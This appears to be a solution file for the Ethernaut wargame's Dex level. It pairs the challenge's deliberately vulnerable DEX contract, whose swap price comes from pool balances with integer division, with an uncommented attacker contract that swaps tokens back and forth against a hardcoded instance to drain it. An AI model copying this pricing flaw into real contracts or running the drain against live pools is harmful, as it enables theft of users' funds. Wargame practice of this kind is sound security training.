

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}



contract Dexxed {

    Dex dex = Dex(0x2B6c4BF1fF88a3643d13852f89C64d622A7249Fc);
    
    ERC20 public token1;
    ERC20 public token2;

    constructor() {
        token1 = ERC20(dex.token1());
        token2 = ERC20(dex.token2());
        token1.approve(address(dex), 1000000);
        token2.approve(address(dex), 1000000);
    }

    function toToken2(uint amount) public {
        dex.swap(address(token1), address(token2), amount);
    }

    function toToken1(uint amount) public {
        dex.swap(address(token2), address(token1), amount);
    }

    function token1Balance(address from) internal view returns (uint) {
        return token1.balanceOf(from);
    }

    function token2Balance(address from) internal view returns (uint) {
        return token2.balanceOf(from);
    }

    function this_token1() public view returns (uint) {
        return token1Balance(address(this));
    }

    function this_token2() public view returns (uint) {
        return token2Balance(address(this));
    }

    function ethernaut_token1() public view returns (uint) {
        return token1Balance(address(dex));
    }

    function ethernaut_token2() public view returns (uint) {
        return token2Balance(address(dex));
    }

}